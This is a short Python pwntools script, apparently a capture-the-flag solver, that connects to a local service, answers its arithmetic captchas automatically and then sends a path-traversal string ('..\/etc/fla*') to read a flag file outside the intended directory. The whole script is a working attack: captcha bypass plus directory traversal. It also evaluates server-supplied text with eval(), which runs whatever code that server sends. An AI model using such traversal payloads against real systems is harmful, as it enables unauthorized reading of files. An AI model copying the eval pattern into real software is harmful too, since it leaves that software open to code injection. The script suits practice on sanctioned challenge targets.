from pwn import *
context.log_level = "debug"
host = "localhost"
port = 32773
p = remote(host, port)

while True:
    p.recvuntil("Captcha:")
    expression = p.recvuntil("=")[:-1]
    p.sendline(str(eval(expression)))
    data = p.recv()
    if "directory" in p.recv(): #wait for directory command
        p.sendline("..\/etc/fla*")
        print(p.recvline())
        break
